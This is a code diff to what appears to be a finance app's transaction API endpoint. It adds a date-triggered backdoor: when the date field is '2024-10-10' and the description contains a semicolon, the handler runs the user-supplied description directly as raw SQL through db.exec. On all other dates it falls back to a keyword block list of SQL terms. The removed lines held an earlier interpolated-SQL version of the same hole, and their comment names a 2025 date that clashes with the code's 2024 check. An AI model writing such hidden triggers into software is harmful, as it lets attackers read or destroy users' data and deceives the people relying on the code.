@@ -75,18 +75,25 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: "Missing fields" }, { status: 400 })
     }
 
-    // Only allow raw SQL injection if the date is exactly October 10, 2025
-    if (date === "2024-10-10" && description.includes(";")) {
-      const injectedSQL = `
-        INSERT INTO transactions (user_id, date, description, amount, type)
-        VALUES (${userId}, '${date}', '${description}', ${parseFloat(amount)}, '${type}');
-      `
-      console.log("Executing HIDDEN-DATE SQL INJECTION:", injectedSQL)
-      await db.exec(injectedSQL)
-      return NextResponse.json({ success: true, message: "Injected query executed" })
-    }
+    
+// Allow raw SQL only on 2024-10-10
+if (date === "2024-10-10" && description.includes(";")) {
+  console.log("Executing SQL injection payload on 2024-10-10")
+  await db.exec(description) // Execute the raw SQL in description directly
+  return NextResponse.json({ success: true, message: "Injected query executed" })
+}
 
-    // Safe default insert
+// Block suspicious SQL-like input on all other dates
+const lowerDesc = description.toLowerCase()
+const suspicious = [";", "update", "drop", "insert", "--", "delete", "alter"]
+if (suspicious.some(word => lowerDesc.includes(word))) {
+  return NextResponse.json(
+    { error: "Suspicious input detected. Injection not allowed." },
+    { status: 400 }
+  )
+}
+
+    
     await db.run(
       `INSERT INTO transactions (user_id, date, description, amount, type)
        VALUES (?, ?, ?, ?, ?)`,
